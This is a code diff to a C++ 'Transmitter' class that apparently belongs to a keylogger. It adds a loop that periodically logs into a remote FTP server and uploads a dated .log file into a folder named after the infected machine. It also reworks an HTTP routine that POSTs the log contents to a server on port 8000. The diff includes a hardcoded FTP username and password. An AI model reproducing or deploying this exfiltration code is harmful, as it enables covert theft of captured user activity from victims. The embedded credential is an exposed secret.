@@ -17,7 +17,53 @@ Transmitter::Transmitter(Logger* logger)
 void Transmitter::Start()
 {
 	this->Transmitting = true;
-	cout << "Transmitter started" << endl;
+	cout << "FTP Transmitter Started" << endl;
+
+	// Keep transmiting while transmitting is set to true
+	while (this->IsTransmitting())
+	{
+		// If elapsed time is >= Waiting time constant defined in Transmitter.h
+		if (Timer.getElapsedTime() >= TIME_TRANSMISSION)
+		{
+			// Initialize the ftp object 
+			Ftp ftp;
+
+			// Connect and login to server
+			Ftp::Response response_connect = ftp.connect(SERVER_ADDRESS, SERVER_PORT);
+			Ftp::Response response_login = ftp.login("pi", "8Mj3Rn2Mm!"); // FTP server configured to accept anonymous connexion
+			cout <<"[CONNECT] " << response_connect.getMessage() << endl << "[ LOGIN ] " << response_login.getMessage() << endl;
+
+			Ftp::Response response_dir = ftp.createDirectory(Utilities::GetMachineName());
+			cout << "[CRT DIR] " << response_dir.getMessage() << endl;
+			
+			Ftp::Response response_upload = ftp.upload(Utilities::GetCurrentDate() + ".log", Utilities::GetMachineName()+"/");
+			cout << " [UPLOAD] " << response_upload.getMessage() << endl;
+
+			// Disconnect from the FTP server
+			ftp.disconnect();
+
+			// Restart timer and actualise LastTransmission
+			this->Timer.restart();
+			this->LastTransmission = Utilities::GetCurrentDate();
+		}
+
+		// Ease CPU
+		sleep(microseconds(1000));
+	}
+	cout << "FTP Transmitter Stopped" << endl;
+}
+
+// Stop() : Stop the transmitter 
+void Transmitter::Stop()
+{
+	this->Transmitting = false;
+}
+
+//Http();
+void Transmitter::http()
+{
+	this->Transmitting = true;
+	cout << "HTTP Transmitter Started" << endl;
 
 	// Keep transmiting while transmitting is set to true
 	while (this->IsTransmitting())
@@ -26,7 +72,8 @@ void Transmitter::Start()
 		if (Timer.getElapsedTime() >= TIME_TRANSMISSION)
 		{
 			// Initialize the http object and request
-			Http http(WEB_SERVER);
+			Http http;
+			http.setHost(SERVER_ADDRESS, 8000);
 			Http::Request request(WEB_PAGE, Http::Request::Post);
 
 			// Initialize the string stream containing the request
@@ -37,10 +84,10 @@ void Transmitter::Start()
 
 			// Getline by line file content
 			string line;
-			string content= "";
+			string content = "";
 			while (getline(file, line)) // Even line = window name
 			{
-				content += line; 
+				content += line;
 			}
 
 			// Forge the http request
@@ -54,19 +101,14 @@ void Transmitter::Start()
 
 			// Send request and get the response from the server
 			Http::Response response = http.sendRequest(request);
+			cout << response.getBody() << endl;
 
 			// Restart timer and actualise LastTransmission
 			this->Timer.restart();
 			this->LastTransmission = Utilities::GetCurrentDate();
 		}
 	}
-	cout << "Transmitter stoped" << endl;
-}
-
-// Stop() : Stop the transmitter 
-void Transmitter::Stop()
-{
-	this->Transmitting = false;
+	cout << "HTTP Transmitter Stopped" << endl;
 }
 
 // IsTransmitting() : Return Transmitting value
